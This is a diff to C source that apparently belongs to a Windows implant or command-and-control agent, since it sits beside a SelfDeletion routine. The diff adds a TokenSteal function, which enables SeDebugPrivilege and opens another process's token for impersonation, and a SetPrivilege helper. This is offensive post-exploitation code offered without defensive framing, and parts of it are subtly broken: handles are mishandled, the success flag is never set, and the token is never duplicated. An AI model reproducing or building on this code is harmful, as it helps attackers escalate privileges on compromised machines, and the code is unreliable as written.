@@ -55,6 +55,67 @@ _Leave:
     return;
 }
 
+BOOL TokenSteal(
+    _In_ DWORD   ProcessId,
+    _In_ HANDLE *TokenHandle
+) {
+    HANDLE ProcessHandle = NULL;
+    BOOL   bCheck        = FALSE;
+    DWORD  Err           = 0;
+
+    if ( *TokenHandle = NtCurrentProcessToken() ) {
+
+        SetPrivilege( *TokenHandle, "SeDebugPrivilege" );
+        
+        bkHandleClose( TokenHandle );
+        TokenHandle = NULL;
+    } 
+
+    Err = bkProcessOpen( PROCESS_QUERY_INFORMATION, TRUE, ProcessId, &ProcessHandle );
+    if ( Err != 0 )
+        return FALSE;
+
+    Err = bkTokenOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle, 0x01 );
+    if ( Err != 0 )
+        return FALSE;
+
+_Leave:
+    if ( ProcessHandle )
+        bkHandleClose( ProcessHandle );
+
+    return bCheck;
+}
+
+BOOL SetPrivilege(
+    _In_ HANDLE hToken,
+    _In_ LPCSTR PrivilegeName
+) {
+    BLACKOUT_INSTANCE
+
+    TOKEN_PRIVILEGES TokenPrivs = { 0x00 };
+    LUID			 Luid       = { 0x00 };
+    BOOL             bCheck     = FALSE;
+
+    bCheck = Instance()->Win32.LookupPrivilegeValueA( NULL, PrivilegeName, &Luid );
+    if ( !bCheck ) return FALSE;
+    
+    TokenPrivs.PrivilegeCount           = 0x01;	// Adjusting one privilege (one element of the 'Privileges' structure array)
+    TokenPrivs.Privileges[0].Luid       = Luid;
+    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    bCheck = Instance()->Win32.AdjustTokenPrivileges(
+        hToken, FALSE, &TokenPrivs, 
+        sizeof( TOKEN_PRIVILEGES ), NULL, NULL
+    );
+    if ( !bCheck ) return FALSE;
+    
+
+    if ( NtLastError() == ERROR_NOT_ALL_ASSIGNED )
+        return FALSE;
+    
+    return bCheck;
+}
+
 FUNC BOOL SelfDeletion(
     void
 ) {
